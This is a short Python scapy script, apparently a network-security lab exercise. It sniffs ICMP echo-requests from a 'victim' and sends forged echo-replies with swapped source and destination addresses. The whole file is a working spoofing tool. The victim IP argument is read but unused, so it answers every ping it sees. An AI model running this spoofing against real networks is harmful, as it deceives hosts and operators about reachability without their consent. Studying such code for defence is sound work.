from scapy.all import *

def spoof_reply(pkt):
    """
    Craft a valid ICMP echo-reply based on an intercepted
    ICMP echo-request    
    """

    if (pkt[2].type == 8):
    #check if the ICMP is a request

        dst=pkt[1].dst
        #store the original packet's destination

        src=pkt[1].src
        #store the original packet's source

        seq = pkt[2].seq
        #store the original packet's sequence

        id = pkt[2].id
        #store the original packet's id

        load=pkt[3].load
        #store the original packet's load

        reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/load
        #construct the reply packet based on details derived from the
        #original packet, but make sure to flip dst and src
        print  "src-ip: {} dst-ip: {}".format(src, dst)
        send(reply)

if __name__=="__main__":
    """
    Sniff ICMP echo-request from a victim's ip and respond
    with valid ICMP echo-reply  
    """

    iface = "enp0s3"
    #define network interface
   
    ip = "10.0.2.15"
    #define default ip

    if (len(sys.argv) > 1):
    #check for any arguments

        ip = sys.argv[1]
        #override the default ip to target victim
   
    #filter = "icmp" 
    #build filter from ip
 
    sniff(iface=iface, prn=spoof_reply, filter="icmp" )
    #start sniffing
